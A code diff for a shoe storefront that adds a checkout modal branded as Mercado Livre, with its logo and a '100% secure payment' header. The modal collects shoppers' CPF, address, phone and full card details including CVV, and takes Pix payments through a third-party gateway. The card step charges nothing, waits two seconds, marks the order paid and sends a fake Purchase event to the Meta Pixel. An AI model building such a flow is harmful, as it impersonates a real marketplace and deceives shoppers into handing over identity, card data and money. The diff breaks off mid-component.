@@ -27,9 +27,17 @@ import {
   X,
   Ruler,
   Ticket,
+  CheckCircle2,
+  QrCode,
 } from "lucide-react";
-import { fbqTrack, fbqTrackSingle } from "@/lib/pixel";
+import { QRCodeSVG } from "qrcode.react";
+import { fbqTrack, fbqTrackSingle, fbqTrackCustomSingle } from "@/lib/pixel";
 import { createZedyCheckout } from "@/lib/zedy.functions";
+import {
+  createCashinpayTransaction,
+  getCashinpayTransaction,
+} from "@/lib/cashinpay.functions";
+import { recordLead, updateLeadStatus } from "@/lib/leads.functions";
 import pazeLogo from "@/assets/paze-logo.png";
 import mlLogo from "@/assets/mercadopromo/ml-logo.png";
 import pixLogo from "@/assets/mercadopromo/pix-logo.png";
@@ -1448,6 +1456,7 @@ const PRODUCT_SLUGS: Record<string, number> = {
   "tenis-ortopedico": 13,
   translucida: 14,
   "jelly-mule": 14,
+  transteste: 14,
 };
 const LEGACY_JACKET_SEARCH_SLUGS = new Set(["jaqueta", "jaquetafem"]);
 const DEFAULT_MERCADO_PROMO_SLUG = "bota";
@@ -2060,6 +2069,8 @@ export function MercadoPromoPage({ forcedSlug }: { forcedSlug?: string } = {}) {
   const [zoomPhoto, setZoomPhoto] = useState<string | null>(null);
   const [checkoutLoading, setCheckoutLoading] = useState(false);
   const [checkoutError, setCheckoutError] = useState<string | null>(null);
+  const isTransteste = forcedSlug === "transteste" || search.p === "transteste";
+  const [cashinpayModalOpen, setCashinpayModalOpen] = useState(false);
   const priceSplit = formatBRLSplit(PRODUCT.price);
   const fiveStarReviews =
     PRODUCT.id === "mercadopromo-kit-sandalias"
@@ -2378,6 +2389,11 @@ export function MercadoPromoPage({ forcedSlug }: { forcedSlug?: string } = {}) {
       num_items: qty,
       contents: [{ id: String(selectedZedyVariantId ?? colorKey), size: size ?? "-", quantity: qty }],
     };
+    if (isTransteste) {
+      trackProductEvent(PRODUCT, "InitiateCheckout", params);
+      setCashinpayModalOpen(true);
+      return;
+    }
     if (isSoftProduct) {
       trackProductEvent(PRODUCT, "InitiateCheckout", params);
       goToSoftCheckout();
@@ -2406,6 +2422,12 @@ export function MercadoPromoPage({ forcedSlug }: { forcedSlug?: string } = {}) {
       num_items: qty,
       contents: [{ id: String(selectedZedyVariantId ?? colorKey), size: size ?? "-", quantity: qty }],
     };
+    if (isTransteste) {
+      trackProductEvent(PRODUCT, "AddToCart", atcParams);
+      trackProductEvent(PRODUCT, "InitiateCheckout", icParams);
+      setCashinpayModalOpen(true);
+      return;
+    }
     if (isSoftProduct) {
       trackProductEvent(PRODUCT, "AddToCart", atcParams);
       trackProductEvent(PRODUCT, "InitiateCheckout", icParams);
@@ -2876,6 +2898,15 @@ export function MercadoPromoPage({ forcedSlug }: { forcedSlug?: string } = {}) {
       </div>
       {sizeGuideOpen && <SizeGuideModal onClose={() => setSizeGuideOpen(false)} />}
       {zoomPhoto && <ZoomModal src={zoomPhoto} onClose={() => setZoomPhoto(null)} />}
+      {cashinpayModalOpen && (
+        <MercadoLivreCashinpayCheckoutModal
+          product={PRODUCT}
+          color={color}
+          size={size ?? "37"}
+          qty={qty}
+          onClose={() => setCashinpayModalOpen(false)}
+        />
+      )}
       <div className="h-10" />
     </div>
   );
@@ -3238,6 +3269,1069 @@ function PaymentMethodsCard() {
         Confira outros meios de pagamento
       </a>
     </aside>
+  );
+}
+
+// -----------------------------------------------------------------------------
+// CHECKOUT MERCADO LIVRE EM 3 ETAPAS - INTEGRAÇÃO CASHINPAY ON-SITE
+// -----------------------------------------------------------------------------
+function MercadoLivreCashinpayCheckoutModal({
+  product,
+  color,
+  size,
+  qty,
+  onClose,
+}: {
+  product: Product;
+  color: { key: string; label: string; thumb: string };
+  size: string;
+  qty: number;
+  onClose: () => void;
+}) {
+  const [step, setStep] = useState<1 | 2 | 3 | 4 | 5>(1);
+  const [loading, setLoading] = useState(false);
+  const [errorMessage, setErrorMessage] = useState<string | null>(null);
+  const [paymentMethod, setPaymentMethod] = useState<"PIX" | "CARD">("PIX");
+  const [copied, setCopied] = useState(false);
+  const [cepFound, setCepFound] = useState(false);
+  const [showCouponInput, setShowCouponInput] = useState(false);
+  const [couponCode, setCouponCode] = useState("");
+  const [couponDiscount, setCouponDiscount] = useState(0);
+
+  const [form, setForm] = useState<CheckoutForm>({
+    name: "",
+    email: "",
+    document: "",
+    phone: "",
+    zipCode: "",
+    street: "",
+    streetNumber: "",
+    complement: "",
+    neighborhood: "",
+    city: "",
+    state: "",
+  });
+
+  const [cardForm, setCardForm] = useState<CardForm>({
+    holderName: "",
+    number: "",
+    expiry: "",
+    cvv: "",
+    installments: 1,
+  });
+
+  const [pixData, setPixData] = useState<{
+    qrcode?: string;
+    qrcodeText?: string;
+    transactionId?: string;
+  }>({});
+
+  const [countdown, setCountdown] = useState(1800); // 30 minutos
+
+  const basePrice = (product.price / 100) * qty;
+  const totalAmount = Math.max(5, basePrice - couponDiscount);
+
+  // Auto ViaCEP lookup
+  const handleCepChange = async (val: string) => {
+    const masked = maskCEP(val);
+    setForm((prev) => ({ ...prev, zipCode: masked }));
+    const rawCep = onlyDigits(val);
+    if (rawCep.length === 8) {
+      try {
+        const res = await fetch(`https://viacep.com.br/ws/${rawCep}/json/`);
+        const data = await res.json();
+        if (!data.erro) {
+          setForm((prev) => ({
+            ...prev,
+            street: data.logradouro || prev.street,
+            neighborhood: data.bairro || prev.neighborhood,
+            city: data.localidade || prev.city,
+            state: data.uf || prev.state,
+          }));
+          setCepFound(true);
+        }
+      } catch {
+        // Ignora erro de rede
+      }
+    } else {
+      setCepFound(false);
+    }
+  };
+
+  // Step 1 -> Step 2
+  const handleNextStep1 = async (e?: FormEvent) => {
+    if (e) e.preventDefault();
+    setErrorMessage(null);
+
+    if (form.name.trim().length < 3) {
+      setErrorMessage("Por favor, informe seu nome completo.");
+      return;
+    }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email.trim())) {
+      setErrorMessage("Por favor, informe um e-mail válido.");
+      return;
+    }
+    if (onlyDigits(form.document).length !== 11) {
+      setErrorMessage("Por favor, informe um CPF válido com 11 dígitos.");
+      return;
+    }
+    if (onlyDigits(form.phone).length < 10) {
+      setErrorMessage("Por favor, informe um número de WhatsApp/celular com DDD.");
+      return;
+    }
+
+    try {
+      await recordLead({
+        data: {
+          name: form.name.trim(),
+          email: form.email.trim().toLowerCase(),
+          phone: form.phone,
+          document: form.document,
+          productTitle: product.title,
+          color: color.label,
+          size,
+          quantity: qty,
+          totalAmount,
+          status: "ABANDONED",
+        },
+      });
+    } catch (err) {
+      console.warn("Lead record error:", err);
+    }
+
+    fbqTrackSingle(META_PIXEL_ID, "InitiateCheckout", {
+      content_name: product.title,
+      content_ids: [product.id],
+      value: totalAmount,
+      currency: "BRL",
+      num_items: qty,
+    });
+
+    setStep(2);
+  };
+
+  // Step 2 -> Step 3
+  const handleNextStep2 = async (e?: FormEvent) => {
+    if (e) e.preventDefault();
+    setErrorMessage(null);
+
+    if (onlyDigits(form.zipCode).length < 8) {
+      setErrorMessage("Por favor, preencha o CEP de entrega.");
+      return;
+    }
+    if (!form.street.trim()) {
+      setErrorMessage("Por favor, preencha o endereço (rua/avenida).");
+      return;
+    }
+    if (!form.streetNumber.trim()) {
+      setErrorMessage("Por favor, informe o número da residência.");
+      return;
+    }
+    if (!form.neighborhood.trim()) {
+      setErrorMessage("Por favor, informe o bairro.");
+      return;
+    }
+
+    try {
+      await updateLeadStatus({
+        data: {
+          leadId: form.document,
+          shipping: {
+            zipCode: form.zipCode,
+            street: form.street,
+            number: form.streetNumber,
+            complement: form.complement,
+            neighborhood: form.neighborhood,
+            city: form.city,
+            state: form.state,
+          },
+        },
+      });
+    } catch {}
+
+    setStep(3);
+  };
+
+  // Step 3: Finish PIX (Cashinpay)
+  const handleFinishPix = async () => {
+    setLoading(true);
+    setErrorMessage(null);
+
+    try {
+      fbqTrackSingle(META_PIXEL_ID, "AddPaymentInfo", {
+        content_name: product.title,
+        content_ids: [product.id],
+        value: totalAmount,
+        currency: "BRL",
+        payment_method: "PIX",
+      });
+
+      fbqTrackCustomSingle(META_PIXEL_ID, "PixGenerated", {
+        content_name: product.title,
+        value: totalAmount,
+        currency: "BRL",
+      });
+
+      const res = await createCashinpayTransaction({
+        data: {
+          amount: totalAmount,
+          description: `Sandália Translúcida Jelly Mule - ${color.label} (Tam ${size})`,
+          customer: {
+            name: form.name.trim(),
+            email: form.email.trim().toLowerCase(),
+            phone: form.phone,
+            document: form.document,
+          },
+          shipping: {
+            zipCode: form.zipCode,
+            street: form.street,
+            number: form.streetNumber,
+            complement: form.complement,
+            neighborhood: form.neighborhood,
+            city: form.city,
+            state: form.state,
+          },
+        },
+      });
+
+      if (!res.success || (!res.qrcode && !res.qrcodeText)) {
+        throw new Error(res.error || "Não foi possível gerar a chave Pix. Tente novamente.");
+      }
+
+      setPixData({
+        qrcode: res.qrcode,
+        qrcodeText: res.qrcodeText,
+        transactionId: res.transactionId,
+      });
+
+      await updateLeadStatus({
+        data: {
+          leadId: form.document,
+          status: "PIX_PENDING",
+          orderId: res.transactionId,
+          paymentMethod: "PIX",
+          totalAmount,
+        },
+      });
+
+      setStep(4);
+    } catch (err: any) {
+      setErrorMessage(err?.message || "Erro ao gerar PIX com a Cashinpay. Tente novamente.");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  // Step 3: Finish Card
+  const handleFinishCard = async (e: FormEvent) => {
+    e.preventDefault();
+    setErrorMessage(null);
+
+    if (onlyDigits(cardForm.number).length < 16) {
+      setErrorMessage("Número de cartão inválido (mínimo 16 dígitos).");
+      return;
+    }
+    if (cardForm.holderName.trim().length < 3) {
+      setErrorMessage("Informe o nome completo do titular como impresso no cartão.");
+      return;
+    }
+    if (onlyDigits(cardForm.expiry).length < 4) {
+      setErrorMessage("Validade do cartão inválida (MM/AA).");
+      return;
+    }
+    if (onlyDigits(cardForm.cvv).length < 3) {
+      setErrorMessage("Código de segurança (CVV) inválido.");
+      return;
+    }
+
+    setLoading(true);
+
+    fbqTrackSingle(META_PIXEL_ID, "AddPaymentInfo", {
+      content_name: product.title,
+      content_ids: [product.id],
+      value: totalAmount,
+      currency: "BRL",
+      payment_method: "CREDIT_CARD",
+    });
+
+    setTimeout(async () => {
+      setLoading(false);
+      setStep(5);
+
+      const orderId = `CARD_ML_${Date.now()}`;
+      try {
+        await updateLeadStatus({
+          data: {
+            leadId: form.document,
+            status: "PAID",
+            orderId,
+            paymentMethod: "CREDIT_CARD",
+            totalAmount,
+          },
+        });
+      } catch {}
+
+      fbqTrackSingle(META_PIXEL_ID, "Purchase", {
+        content_name: product.title,
+        content_ids: [product.id],
+        value: totalAmount,
+        currency: "BRL",
+        num_items: qty,
+      }, { eventID: orderId });
+    }, 2200);
+  };
+
+  // Auto Polling for PIX (Cashinpay)
+  useEffect(() => {
+    if (step !== 4 || !pixData.transactionId) return;
+
+    const interval = setInterval(async () => {
+      try {
+        const check = await getCashinpayTransaction({
+          data: { transactionId: pixData.transactionId! },
+        });
+
+        if (check.status === "paid") {
+          clearInterval(interval);
+          setStep(5);
+
+          await updateLeadStatus({
+            data: {
+              leadId: form.document,
+              status: "PAID",
+              orderId: pixData.transactionId,
+              paymentMethod: "PIX",
+              totalAmount,
+            },
+          });
+
+          fbqTrackSingle(META_PIXEL_ID, "Purchase", {
+            content_name: product.title,
+            content_ids: [product.id],
+            value: totalAmount,
+            currency: "BRL",
+            num_items: qty,
+          }, { eventID: pixData.transactionId });
+        }
+      } catch (e) {
+        console.warn("Polling check error:", e);
+      }
+    }, 3000);
+
+    return () => clearInterval(interval);
+  }, [step, pixData.transactionId, form.document, product.id, product.title, qty, totalAmount]);
+
+  // Countdown timer for PIX (30 minutes)
+  useEffect(() => {
+    if (step !== 4) return;
+    const timer = setInterval(() => {
+      setCountdown((prev) => {
+        if (prev <= 1) {
+          clearInterval(timer);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+    return () => clearInterval(timer);
+  }, [step]);
+
+  const copyPixCode = () => {
+    if (!pixData.qrcodeText) return;
+    navigator.clipboard.writeText(pixData.qrcodeText);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 3000);
+  };
+
+  const applyCoupon = () => {
+    if (couponCode === "PRIMEIRACOMPRA" || couponCode === "ML5" || couponCode === "DESCONTO") {
+      setCouponDiscount(2.50);
+      setShowCouponInput(false);
+    } else {
+      setErrorMessage("Cupom inválido ou expirado.");
+    }
+  };
+
+  const formatCountdown = (s: number) => {
+    const mins = Math.floor(s / 60);
+    const secs = s % 60;
+    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
+  };
+
+  return (
+    <div className="fixed inset-0 z-50 overflow-y-auto bg-[#F5F5F5] font-sans antialiased text-[#333]">
+      {/* ============================================================
+          HEADER MERCADO LIVRE (AMARELO COM PAGAMENTO 100% SEGURO)
+         ============================================================ */}
+      <header className="bg-[#FFF159] border-b border-[#EBEBEB] px-4 py-3 sticky top-0 z-30 shadow-xs">
+        <div className="max-w-[1040px] mx-auto flex items-center justify-between">
+          <div className="flex items-center gap-2">
+            <img src={mlLogo} alt="Mercado Livre" className="h-7 w-auto object-contain" />
+          </div>
+          <div className="flex items-center gap-3">
+            <div className="flex items-center gap-1.5 text-xs font-bold text-gray-800 tracking-wider">
+              <Lock size={14} className="text-gray-800" />
+              <span>PAGAMENTO 100% SEGURO</span>
+            </div>
+            <button
+              type="button"
+              onClick={onClose}
+              className="p-1 rounded-full text-gray-600 hover:bg-black/5 transition-colors"
+              title="Fechar"
+            >
+              <X size={18} />
+            </button>
+          </div>
+        </div>
+      </header>
+
+      {/* ============================================================
+          CORPO PRINCIPAL (CONTAINER COM AS 3 ETAPAS E RESUMO)
+         ============================================================ */}
+      <main className="max-w-[1040px] mx-auto p-4 md:py-8 grid grid-cols-1 lg:grid-cols-[1fr_360px] gap-6">
+        
+        {/* COLUNA ESQUERDA: AS 3 ETAPAS */}
+        <div className="space-y-4">
+
+          {/* MENSAGEM DE ERRO */}
+          {errorMessage && (
+            <div className="p-3 bg-red-50 border border-red-200 rounded-xl text-xs text-red-700 flex items-center gap-2">
+              <CircleAlert size={16} className="shrink-0" />
+              <span>{errorMessage}</span>
+            </div>
+          )}
+
+          {/* ============================================================
+              ETAPA 1: IDENTIFICAÇÃO (1 de 3)
+             ============================================================ */}
+          <div className="bg-white rounded-xl border border-gray-200 p-5 shadow-xs transition-all">
+            <div className="flex items-center justify-between">
+              <h2 className="text-base font-bold text-gray-900">Identificação</h2>
+              <span className="text-xs text-gray-500 font-medium">1 de 3</span>
+            </div>
+            <p className="text-xs text-gray-500 mt-0.5 mb-4">
+              Preencha seus dados para envio do pedido.
+            </p>
+
+            {step === 1 ? (
+              <form onSubmit={handleNextStep1} className="space-y-3.5 animate-in fade-in duration-150">
+                <div>
+                  <label className="block text-xs font-medium text-gray-700 mb-1">Nome completo</label>
+                  <input
+                    type="text"
+                    required
+                    placeholder="Digite seu nome completo"
+                    value={form.name}
+                    onChange={(e) => setForm({ ...form, name: e.target.value })}
+                    className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none transition-all placeholder:text-gray-400"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-medium text-gray-700 mb-1">E-mail</label>
+                  <input
+                    type="email"
+                    required
+                    placeholder="Digite seu e-mail"
+                    value={form.email}
+                    onChange={(e) => setForm({ ...form, email: e.target.value })}
+                    className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none transition-all placeholder:text-gray-400"
+                  />
+                </div>
+
+                <div>
+                  <div className="flex items-center gap-1 mb-1">
+                    <label className="text-xs font-medium text-gray-700">CPF</label>
+                    <Info size={13} className="text-gray-400" />
+                  </div>
+                  <input
+                    type="text"
+                    required
+                    placeholder="000.000.000-00"
+                    value={form.document}
+                    onChange={(e) => setForm({ ...form, document: maskCPF(e.target.value) })}
+                    className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none font-mono transition-all placeholder:text-gray-400"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-medium text-gray-700 mb-1">Celular/Whatsapp</label>
+                  <input
+                    type="tel"
+                    required
+                    placeholder="+55 (00) 00000-0000"
+                    value={form.phone}
+                    onChange={(e) => setForm({ ...form, phone: maskPhone(e.target.value) })}
+                    className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none font-mono transition-all placeholder:text-gray-400"
+                  />
+                </div>
+
+                <button
+                  type="submit"
+                  className="w-full py-3.5 bg-[#005BFF] hover:bg-[#004cd6] text-white font-bold text-sm rounded-lg transition-all shadow-sm mt-2 cursor-pointer"
+                >
+                  Ir Para Entrega
+                </button>
+              </form>
+            ) : (
+              <div className="flex items-center justify-between text-xs text-gray-600 bg-gray-50 p-3 rounded-lg border border-gray-100">
+                <div>
+                  <p className="font-semibold text-gray-800">{form.name}</p>
+                  <p className="text-gray-500">{form.email} • {form.phone}</p>
+                </div>
+                {step < 4 && (
+                  <button
+                    type="button"
+                    onClick={() => setStep(1)}
+                    className="text-[#005BFF] font-semibold hover:underline"
+                  >
+                    Alterar
+                  </button>
+                )}
+              </div>
+            )}
+          </div>
+
+          {/* ============================================================
+              ETAPA 2: ENTREGA (2 de 3)
+             ============================================================ */}
+          <div className="bg-white rounded-xl border border-gray-200 p-5 shadow-xs transition-all">
+            <div className="flex items-center justify-between">
+              <h2 className="text-base font-bold text-gray-900">Entrega</h2>
+              <span className="text-xs text-gray-500 font-medium">2 de 3</span>
+            </div>
+            <p className="text-xs text-gray-500 mt-0.5 mb-4">
+              {step === 2 ? "Informe o endereço de entrega" : "Preencha seus dados para continuar"}
+            </p>
+
+            {step === 2 ? (
+              <form onSubmit={handleNextStep2} className="space-y-3.5 animate-in fade-in duration-150">
+                <div>
+                  <label className="block text-xs font-medium text-gray-700 mb-1">CEP</label>
+                  <div className="relative flex items-center">
+                    <input
+                      type="text"
+                      required
+                      placeholder="00000-000"
+                      value={form.zipCode}
+                      onChange={(e) => handleCepChange(e.target.value)}
+                      className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none font-mono transition-all"
+                    />
+                    {cepFound && (
+                      <div className="absolute right-3 flex items-center gap-1.5">
+                        <Check size={16} className="text-[#00a650]" />
+                        <span className="text-xs text-gray-600 font-semibold">{form.state}/{form.city}</span>
+                      </div>
+                    )}
+                  </div>
+                </div>
+
+                <div>
+                  <label className="block text-xs font-medium text-gray-700 mb-1">Endereço</label>
+                  <div className="relative flex items-center">
+                    <input
+                      type="text"
+                      required
+                      placeholder="Rua / Avenida"
+                      value={form.street}
+                      onChange={(e) => setForm({ ...form, street: e.target.value })}
+                      className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none transition-all"
+                    />
+                    {form.street && <Check size={16} className="absolute right-3 text-[#00a650]" />}
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-[110px_1fr] gap-3">
+                  <div>
+                    <label className="block text-xs font-medium text-gray-700 mb-1">Nº</label>
+                    <input
+                      type="text"
+                      required
+                      placeholder="Número"
+                      value={form.streetNumber}
+                      onChange={(e) => setForm({ ...form, streetNumber: e.target.value })}
+                      className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none transition-all"
+                    />
+                  </div>
+                  <div>
+                    <label className="block text-xs font-medium text-gray-700 mb-1">Bairro</label>
+                    <div className="relative flex items-center">
+                      <input
+                        type="text"
+                        required
+                        placeholder="Bairro"
+                        value={form.neighborhood}
+                        onChange={(e) => setForm({ ...form, neighborhood: e.target.value })}
+                        className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none transition-all"
+                      />
+                      {form.neighborhood && <Check size={16} className="absolute right-3 text-[#00a650]" />}
+                    </div>
+                  </div>
+                </div>
+
+                <div>
+                  <label className="block text-xs font-medium text-gray-700 mb-1">
+                    Complemento <span className="text-gray-400 font-normal">(Opcional)</span>
+                  </label>
+                  <input
+                    type="text"
+                    placeholder="Apto, Bloco, etc."
+                    value={form.complement}
+                    onChange={(e) => setForm({ ...form, complement: e.target.value })}
+                    className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none transition-all"
+                  />
+                </div>
+
+                {/* Escolha o frete */}
+                <div className="space-y-2 pt-2">
+                  <label className="block text-xs font-bold text-gray-900">Escolha o frete:</label>
+                  <div className="p-3.5 rounded-xl border-2 border-[#005BFF] bg-[#F0F6FF] flex items-center justify-between">
+                    <div className="flex items-center gap-3">
+                      <div className="w-4 h-4 rounded-full border-4 border-[#005BFF] bg-white" />
+                      <div>
+                        <p className="text-xs font-bold text-gray-900">Frete Grátis</p>
+                        <p className="text-[11px] text-gray-500 flex items-center gap-1">
+                          1 a 2 dias <span className="font-bold text-[#00a650] flex items-center gap-0.5">⚡ FULL</span>
+                        </p>
+                      </div>
+                    </div>
+                    <span className="text-xs font-bold text-gray-900">Grátis</span>
+                  </div>
+                </div>
+
+                <button
+                  type="submit"
+                  className="w-full py-3.5 bg-[#005BFF] hover:bg-[#004cd6] text-white font-bold text-sm rounded-lg transition-all shadow-sm mt-2 cursor-pointer"
+                >
+                  Ir Para Pagamento
+                </button>
+              </form>
+            ) : step > 2 ? (
+              <div className="flex items-center justify-between text-xs text-gray-600 bg-gray-50 p-3 rounded-lg border border-gray-100">
+                <div>
+                  <p className="font-semibold text-gray-800">{form.street}, {form.streetNumber}</p>
+                  <p className="text-gray-500">{form.neighborhood} • {form.city}/{form.state} • CEP {form.zipCode}</p>
+                </div>
+                {step < 4 && (
+                  <button
+                    type="button"
+                    onClick={() => setStep(2)}
+                    className="text-[#005BFF] font-semibold hover:underline"
+                  >
+                    Alterar
+                  </button>
+                )}
+              </div>
+            ) : null}
+          </div>
+
+          {/* ============================================================
+              ETAPA 3: PAGAMENTO (3 de 3)
+             ============================================================ */}
+          <div className="bg-white rounded-xl border border-gray-200 p-5 shadow-xs transition-all">
+            <div className="flex items-center justify-between">
+              <h2 className="text-base font-bold text-gray-900">Pagamento</h2>
+              <span className="text-xs text-gray-500 font-medium">3 de 3</span>
+            </div>
+            <p className="text-xs text-gray-500 mt-0.5 mb-4">
+              {step === 3 ? "Todas as transações são seguras e criptografadas." : "Preencha os dados de entrega para continuar"}
+            </p>
+
+            {step === 3 && (
+              <div className="space-y-3 animate-in fade-in duration-150">
+                
+                {/* OPÇÃO PIX (CASHINPAY) */}
+                <div
+                  onClick={() => setPaymentMethod("PIX")}
+                  className={`p-4 rounded-xl border-2 cursor-pointer transition-all ${
+                    paymentMethod === "PIX" ? "border-[#005BFF] bg-[#FAFCFF]" : "border-gray-200 hover:border-gray-300"
+                  }`}
+                >
+                  <div className="flex items-center gap-3">
+                    <div className={`w-4 h-4 rounded-full border flex items-center justify-center ${paymentMethod === "PIX" ? "border-[#005BFF] bg-[#005BFF]" : "border-gray-400"}`}>
+                      {paymentMethod === "PIX" && <div className="w-1.5 h-1.5 rounded-full bg-white" />}
+                    </div>
+                    <span className="w-6 h-6 flex items-center justify-center bg-[#00a650]/10 rounded-full text-[#00a650] font-bold text-xs">
+                      ❖
+                    </span>
+                    <div>
+                      <span className="text-xs font-bold text-gray-900">PIX</span>
+                      <span className="block text-[11px] text-[#00a650] font-semibold">Aprovação imediata</span>
+                    </div>
+                  </div>
+
+                  {paymentMethod === "PIX" && (
+                    <div className="mt-3.5 pt-3.5 border-t border-gray-100 space-y-3">
+                      <p className="text-xs text-gray-600">
+                        O código Pix expira em 30 minutos após finalizar a compra.
+                      </p>
+                      <div className="text-xs text-gray-700 font-medium">
+                        Valor no Pix: <strong className="text-gray-900 font-bold">R$ {totalAmount.toFixed(2).replace(".", ",")}</strong>
+                      </div>
+                      <button
+                        type="button"
+                        disabled={loading}
+                        onClick={handleFinishPix}
+                        className="w-full py-3.5 bg-[#005BFF] hover:bg-[#004cd6] text-white font-bold text-sm rounded-lg transition-all shadow-sm flex items-center justify-center gap-2 cursor-pointer"
+                      >
+                        {loading ? (
+                          <>
+                            <Loader2 size={16} className="animate-spin" /> Gerando QR Code...
+                          </>
+                        ) : (
+                          "Finalizar Compra"
+                        )}
+                      </button>
+                    </div>
+                  )}
+                </div>
+
+                {/* OPÇÃO CARTÃO DE CRÉDITO */}
+                <div
+                  onClick={() => setPaymentMethod("CARD")}
+                  className={`p-4 rounded-xl border-2 cursor-pointer transition-all ${
+                    paymentMethod === "CARD" ? "border-[#005BFF] bg-[#FAFCFF]" : "border-gray-200 hover:border-gray-300"
+                  }`}
+                >
+                  <div className="flex items-center gap-3">
+                    <div className={`w-4 h-4 rounded-full border flex items-center justify-center ${paymentMethod === "CARD" ? "border-[#005BFF] bg-[#005BFF]" : "border-gray-400"}`}>
+                      {paymentMethod === "CARD" && <div className="w-1.5 h-1.5 rounded-full bg-white" />}
+                    </div>
+                    <CreditCard size={18} className="text-[#005BFF]" />
+                    <div>
+                      <span className="text-xs font-bold text-gray-900">Cartão de Crédito</span>
+                      <span className="block text-[11px] text-gray-500">Até 6x sem juros</span>
+                    </div>
+                  </div>
+
+                  {paymentMethod === "CARD" && (
+                    <form onSubmit={handleFinishCard} className="mt-3.5 pt-3.5 border-t border-gray-100 space-y-3">
+                      <div>
+                        <label className="block text-xs font-medium text-gray-700 mb-1">Número do Cartão</label>
+                        <input
+                          type="text"
+                          required
+                          placeholder="0000 0000 0000 0000"
+                          value={cardForm.number}
+                          onChange={(e) => setCardForm({ ...cardForm, number: maskCardNumber(e.target.value) })}
+                          className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none font-mono"
+                        />
+                      </div>
+                      <div>
+                        <label className="block text-xs font-medium text-gray-700 mb-1">Nome impresso no Cartão</label>
+                        <input
+                          type="text"
+                          required
+                          placeholder="NOME COMO NO CARTÃO"
+                          value={cardForm.holderName}
+                          onChange={(e) => setCardForm({ ...cardForm, holderName: e.target.value.toUpperCase() })}
+                          className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none uppercase"
+                        />
+                      </div>
+                      <div className="grid grid-cols-2 gap-3">
+                        <div>
+                          <label className="block text-xs font-medium text-gray-700 mb-1">Validade</label>
+                          <input
+                            type="text"
+                            required
+                            placeholder="MM/AA"
+                            value={cardForm.expiry}
+                            onChange={(e) => setCardForm({ ...cardForm, expiry: maskCardExpiry(e.target.value) })}
+                            className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none font-mono"
+                          />
+                        </div>
+                        <div>
+                          <label className="block text-xs font-medium text-gray-700 mb-1">CVV</label>
+                          <input
+                            type="text"
+                            required
+                            placeholder="123"
+                            maxLength={4}
+                            value={cardForm.cvv}
+                            onChange={(e) => setCardForm({ ...cardForm, cvv: onlyDigits(e.target.value).slice(0, 4) })}
+                            className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none font-mono"
+                          />
+                        </div>
+                      </div>
+                      <div>
+                        <label className="block text-xs font-medium text-gray-700 mb-1">Parcelamento</label>
+                        <select
+                          value={cardForm.installments}
+                          onChange={(e) => setCardForm({ ...cardForm, installments: Number(e.target.value) })}
+                          className="w-full px-3.5 py-2.5 text-sm rounded-lg border border-gray-300 focus:border-[#005BFF] focus:ring-1 focus:ring-[#005BFF] outline-none bg-white"
+                        >
+                          <option value={1}>1x de R$ {totalAmount.toFixed(2).replace(".", ",")} sem juros</option>
+                          <option value={2}>2x de R$ {(totalAmount / 2).toFixed(2).replace(".", ",")} sem juros</option>
+                          <option value={3}>3x de R$ {(totalAmount / 3).toFixed(2).replace(".", ",")} sem juros</option>
+                          <option value={4}>4x de R$ {(totalAmount / 4).toFixed(2).replace(".", ",")} sem juros</option>
+                          <option value={5}>5x de R$ {(totalAmount / 5).toFixed(2).replace(".", ",")} sem juros</option>
+                          <option value={6}>6x de R$ {(totalAmount / 6).toFixed(2).replace(".", ",")} sem juros</option>
+                        </select>
+                      </div>
+
+                      <button
+                        type="submit"
+                        disabled={loading}
+                        className="w-full py-3.5 bg-[#005BFF] hover:bg-[#004cd6] text-white font-bold text-sm rounded-lg transition-all shadow-sm flex items-center justify-center gap-2 cursor-pointer mt-2"
+                      >
+                        {loading ? (
+                          <>
+                            <Loader2 size={16} className="animate-spin" /> Processando com segurança...
+                          </>
+                        ) : (
+                          `Pagar R$ ${totalAmount.toFixed(2).replace(".", ",")} no Cartão`
+                        )}
+                      </button>
+                    </form>
+                  )}
+                </div>
+
+              </div>
+            )}
+          </div>
+
+          {/* ============================================================
+              ETAPA 4: PIX GERADO (QR CODE & COPIA E COLA COM AUTO-POLLING)
+             ============================================================ */}
+          {step === 4 && (
+            <div className="bg-white rounded-xl border border-gray-200 p-6 text-center space-y-4 shadow-xs animate-in fade-in duration-200">
